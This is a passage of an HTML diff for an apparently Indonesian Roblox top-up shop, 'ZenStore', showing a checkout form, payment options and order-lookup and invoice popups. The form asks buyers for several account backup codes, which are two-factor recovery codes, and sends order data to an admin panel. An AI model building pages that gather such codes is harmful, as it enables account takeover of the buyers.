+                <input type="text" id="rbx-code-4" placeholder="Kode Backup 4">
+                <input type="text" id="rbx-code-5" placeholder="Kode Backup 5">
+            </div>
+
+            <label>Pilih Metode Pembayaran:</label>
+            <select id="payment-select">
+                <option value="QRIS All Payment">QRIS All Payment (Scan Bebas Admin)</option>
+                <option value="DANA (085872562036)">DANA (085872562036)</option>
+                <option value="GoPay (085872562036)">GoPay (085872562036)</option>
+                <option value="OVO (085872562036)">OVO (085872562036)</option>
+                <option value="Bank BCA (1234567890)">Bank BCA (1234567890)</option>
+            </select>
+
+            <button onclick="sendOrderToAdminWeb()" class="btn-pay-web">Bayar Sekarang</button>
+        </div>
+
+    </div>
+
+    <!-- MODAL POPUP CEK PESANAN -->
+    <div id="cek-pesanan-modal" class="modal-popup">
+        <div class="modal-card-box">
+            <h3>Cek Pesanan Kamu</h3>
+            <p style="font-size:11px; color:#aaa;">Cek status transaksimu secara otomatis di bawah ini:</p>
+
+            <div class="search-tab-switch">
+                <button id="tab-search-user" class="search-tab-btn active" onclick="setSearchMode('user')">Pakai Username / ID</button>
+                <button id="tab-search-invoice" class="search-tab-btn" onclick="setSearchMode('invoice')">Pakai Invoice ID</button>
+            </div>
+
+            <input type="text" id="search-input-val" class="search-input-field" placeholder="Masukkan Username / User ID kamu...">
+            <button onclick="searchOrder()" class="btn-pay-web" style="margin-top:0;">Cek Pesananku</button>
+
+            <div id="search-result-content" style="margin-top:15px;"></div>
+
+            <p onclick="closeCekPesanan()" style="margin-top:15px; font-size:12px; color:#aaa; cursor:pointer;">Tutup</p>
+        </div>
+    </div>
+
+    <!-- MODAL POPUP INVOICE -->
+    <div id="invoice-modal" class="modal-popup">
+        <div class="modal-card-box">
+            <h3 style="color:#00f2fe;">Pesanan Berhasil Dibuat!</h3>
+            <p style="font-size:11px; color:#aaa; margin-top:4px;">Data pesanan sudah masuk ke Web Admin ZenStore.</p>
+
+            <div class="invoice-detail">
+                <p>No. Pesanan: <span id="inv-id">-</span></p>
+                <p>Produk: <span id="inv-item">-</span></p>
+                <p>Data Akun/ID: <span id="inv-user">-</span></p>
+                <p>Metode Bayar: <span id="inv-pay">-</span></p>
+            </div>
+
+            <p style="font-size:11px; color:#00f2fe;">Silakan selesaikan pembayaran. Admin akan memproses pesananmu langsung dari web!</p>
+            <button onclick="document.getElementById('invoice-modal').style.display='none'" class="btn-pay-web" style="margin-top:15px;">Selesai</button>
+        </div>
+    </div>
+</body>
+</html>
